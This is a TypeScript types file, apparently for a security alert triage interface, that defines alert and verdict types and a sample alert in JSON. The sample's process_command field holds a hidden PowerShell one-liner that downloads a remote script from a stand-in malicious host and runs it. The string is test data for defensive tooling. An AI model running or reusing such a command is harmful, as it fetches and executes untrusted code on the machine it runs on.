export type AlertLevel = 'Critical' | 'High' | 'Medium' | 'Low' | 'Info';
export type AlertVerdict = 'Malicious' | 'Suspicious' | 'Benign' | 'Unknown';

export interface SecurityAlert {
  id: string;
  name: string;
  level: AlertLevel;
  verdict: AlertVerdict;
  tactic: string;
  technique: string;
  sourceIp: string;
  destIp: string;
  hostIp: string;
  uploadTime: string;
  firstAlertTime: string;
  lastAlertTime: string;
}

export type ViewState = 'alert-list' | 'triage';

export const SAMPLE_ALERT_JSON = `{
  "alert_id": "ALRT-2024-8992",
  "timestamp": "2024-05-21T14:30:00Z",
  "alert_name": "Suspicious PowerShell Execution",
  "severity": "High",
  "source_ip": "192.168.1.105",
  "destination_ip": "45.33.32.156",
  "process_command": "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://malicious.com/payload.ps1'))",
  "user": "corp\\jdoe",
  "host": "FINANCE-WS-02",
  "edr_verdict": "Suspicious"
}`;
